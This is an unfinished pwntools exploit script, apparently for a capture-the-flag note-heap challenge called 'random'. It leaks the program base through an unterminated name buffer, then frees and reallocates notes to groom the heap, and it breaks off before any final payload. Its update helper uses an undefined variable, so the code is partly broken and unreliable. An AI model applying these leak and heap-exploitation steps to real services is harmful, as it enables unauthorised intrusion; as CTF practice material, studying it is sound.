#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./random"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()


r.sendafter("Please input your name:","a"*8)
r.recvuntil("a"*8)
elf.address = u64(r.recv(6).ljust(8,"\x00"))-0xb90
r.sendline("35")

def add(isadd,size = 0,data=0,tom=0):
    r.sendlineafter(" to add note?(Y/N)",str(isadd))
    if isadd == "Y":
        r.sendlineafter("Input the size of the note:",str(size))
        r.sendafter("ent of the note:",data)
        r.sendlineafter("note, tomorrow?(Y/N)",tom)

def view(isadd,idx):
    r.sendlineafter(" to view note?(Y/N)",str(isadd))
    if isadd == "Y":
        r.sendlineafter("Input the index of the note:\n",str(idx))
        data = r.recvline()[:-1]
        return data

def update(isup,idx,data):
    r.sendlineafter("update note?(Y/N)",is_up)
    if isup=='Y':
        r.sendlineafter("Input the index of the note:",str(idx))
        r.sendafter("Input the new content of the note:",data)

def dele(isdel,idx):
    r.sendlineafter("delete note?(Y/N)",isdel)
    if isdel=='Y':
        r.sendlineafter("Input the index of the note:",str(idx))

r.sendlineafter("today?(0~10)","2")
r.sendline("2")
r.sendline("0")
add("Y",0x3f,"a"*0x3f,"Y")#0
dele("Y",0)
r.sendlineafter("today?(0~10)","0")
r.sendlineafter("note","N")
r.sendlineafter("note","N")

r.sendlineafter("today?(0~10)","2")
r.sendline("2")
r.sendline("0")
add("Y",0x17,"a"*0x17,"Y")#0

#r.sendlineafter("note","N")
#r.sendlineafter("note","N")


r.interactive()




